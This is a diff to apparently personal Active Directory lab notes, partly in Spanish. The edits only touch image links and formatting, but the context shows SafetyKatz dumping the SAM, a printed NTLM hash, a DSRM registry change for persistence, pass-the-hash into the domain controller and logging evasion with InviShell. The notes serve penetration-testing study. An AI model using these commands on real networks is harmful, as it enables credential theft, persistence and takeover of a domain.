@@ -45,10 +45,10 @@ Now, upload the safetycat to us webserver and do the peticion -->
 C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
 ```
 
-<figure><img src="../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (62).png" alt=""><figcaption></figcaption></figure>
 
-> RID : 000001f4 (500)> \
-> User : Administrator> \
+> RID : 000001f4 (500)\
+> User : Administrator\
 > Hash NTLM: a102ad5753f4c441e3af31c97fad86fd
 
 With it, we dumping the SAM and get the NTML hash of Administrator
@@ -58,9 +58,9 @@ With it, we dumping the SAM and get the NTML hash of Administrator
 | **Administrator (dominio)**             | NTDS.dit (base AD) | Cuenta de dominio   | Loguearte en cualquier máquina del dominio como DA    | La que usas para DA total (golden, etc.)   |
 | **Administrator (DSRM / local del DC)** | SAM local del DC   | Cuenta local del DC | Loguearte **solo** en ese DC cuando está en modo DSRM | La que reseteas y usas para entrar en DSRM |
 
-<mark style="background-color:yellow;">The DSRM administrator is not allowed to logon to the DC from network.</mark>&#x20;
+<mark style="background-color:yellow;">The DSRM administrator is not allowed to logon to the DC from network.</mark>
 
-So, we need to change the logon behavior for the account by modifying registry on the DC.&#x20;
+So, we need to change the logon behavior for the account by modifying registry on the DC.
 
 ### Change Registry on the DC - Add Remote Connections
 
@@ -72,7 +72,7 @@ We can do this as follows:
 reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
 ```
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>
 
 > Modificar el registro del DC para permitir logon remoto con DSRM Admin
 >
@@ -87,7 +87,7 @@ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" 
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
 ```
 
-From the new process, we can now access dcorp-dc.&#x20;
+From the new process, we can now access dcorp-dc.
 
 > * **Qué hace**: Usa el NTLM hash del DSRM Administrator para autenticarte remotamente en el DC (PTH) y abre una nueva cmd como ese usuario local.
 > * **Por qué PTH y no OPTH**: Es cuenta **local** (no de dominio) → solo NTLM funciona, no Kerberos.
@@ -106,7 +106,7 @@ powershell -ExecutionPolicy Bypass
 Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>
 
 > * **Qué hace**: Añade la IP del DC a TrustedHosts → permite WinRM con NTLM (sin Kerberos).
 > * **Por qué IP y no FQDN**: NTLM no resuelve Kerberos → hay que usar IP.
@@ -123,4 +123,4 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
 ```
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>
